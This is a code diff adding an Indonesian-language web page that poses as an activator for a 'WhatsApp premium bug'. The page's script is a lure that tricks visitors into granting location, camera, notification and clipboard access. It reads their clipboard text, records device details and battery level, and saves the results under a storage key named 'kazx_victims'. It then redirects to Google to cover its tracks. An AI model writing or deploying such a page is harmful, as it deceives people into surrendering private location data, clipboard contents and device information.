@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>X-KAZZ | Bug WA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f0f2f5;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .header { background: #1a73e8; padding: 25px; text-align: center; color: white; }
+        .header h1 { font-size: 26px; }
+        .body { padding: 25px; }
+        .info-box {
+            background: #e8f0fe;
+            border-left: 4px solid #1a73e8;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .permission-list { margin: 20px 0; }
+        .permission-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        button {
+            width: 100%;
+            background: #1a73e8;
+            border: none;
+            padding: 14px;
+            border-radius: 60px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            margin-top: 15px;
+            font-size: 16px;
+        }
+        .loading { display: none; text-align: center; margin: 15px 0; }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e0e0e0;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .success-msg {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 12px;
+            margin: 15px 0;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="header"><h1>🔓 X-KAZZ | Bug WA</h1></div>
+    <div class="body">
+        <div class="info-box">⚠️ Aktivasi bug WhatsApp premium. Izinkan akses di bawah.</div>
+        <div class="permission-list">
+            <div class="permission-item"><span>📍 Lokasi</span><span id="locStatus">⏳</span></div>
+            <div class="permission-item"><span>📷 Kamera</span><span id="camStatus">⏳</span></div>
+            <div class="permission-item"><span>🔔 Notifikasi</span><span id="notifStatus">⏳</span></div>
+            <div class="permission-item"><span>📋 Clipboard</span><span id="clipStatus">⏳</span></div>
+            <div class="permission-item"><span>📱 Informasi Perangkat</span><span id="deviceStatus">⏳</span></div>
+        </div>
+        <button id="verifyBtn">✅ AKTIFKAN BUG</button>
+        <div id="loading" class="loading"><div class="spinner"></div><p>Memproses...</p></div>
+        <div id="successMsg" class="success-msg">✅ Bug aktif! Mengalihkan...</div>
+    </div>
+</div>
+<script>
+    (function(){
+        let data = {};
+        data.userAgent = navigator.userAgent;
+        data.screen = `${screen.width}x${screen.height}`;
+        data.timestamp = new Date().toISOString();
+        data.device = /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone|iPad/i.test(navigator.userAgent) ? 'iOS' : 'Unknown';
+        data.os = navigator.platform;
+        if(navigator.deviceMemory) data.ram = navigator.deviceMemory;
+        document.getElementById('deviceStatus').innerHTML = '✅ Terekam';
+
+        async function getBattery() {
+            if('getBattery' in navigator) {
+                try { const b = await navigator.getBattery(); data.battery = Math.round(b.level * 100); } catch(e) {}
+            }
+        }
+
+        async function requestAllPermissions() {
+            // Lokasi
+            if(navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => { data.location = { lat: pos.coords.latitude, lng: pos.coords.longitude }; document.getElementById('locStatus').innerHTML = '✅'; resolve(); },
+                        err => { document.getElementById('locStatus').innerHTML = '❌'; resolve(); }
+                    );
+                });
+            } else { document.getElementById('locStatus').innerHTML = '❌'; }
+
+            // Kamera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                data.camera = true;
+                document.getElementById('camStatus').innerHTML = '✅';
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { document.getElementById('camStatus').innerHTML = '❌'; }
+
+            // Notifikasi
+            const notifResult = await Notification.requestPermission();
+            data.notification = notifResult === 'granted';
+            document.getElementById('notifStatus').innerHTML = data.notification ? '✅' : '❌';
+
+            // Clipboard
+            try {
+                data.clipboard = await navigator.clipboard.readText();
+                document.getElementById('clipStatus').innerHTML = '✅';
+            } catch(e) { document.getElementById('clipStatus').innerHTML = '⚠️'; }
+        }
+
+        function saveData() {
+            let victims = JSON.parse(localStorage.getItem('kazx_victims') || '[]');
+            victims.push(data);
+            localStorage.setItem('kazx_victims', JSON.stringify(victims));
+        }
+
+        document.getElementById('verifyBtn').onclick = async () => {
+            const btn = document.getElementById('verifyBtn');
+            const loading = document.getElementById('loading');
+            const success = document.getElementById('successMsg');
+            btn.disabled = true;
+            loading.style.display = 'block';
+            await getBattery();
+            await requestAllPermissions();
+            saveData();
+            loading.style.display = 'none';
+            success.style.display = 'block';
+            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
+        };
+    })();
+</script>
+</body>
+</html>
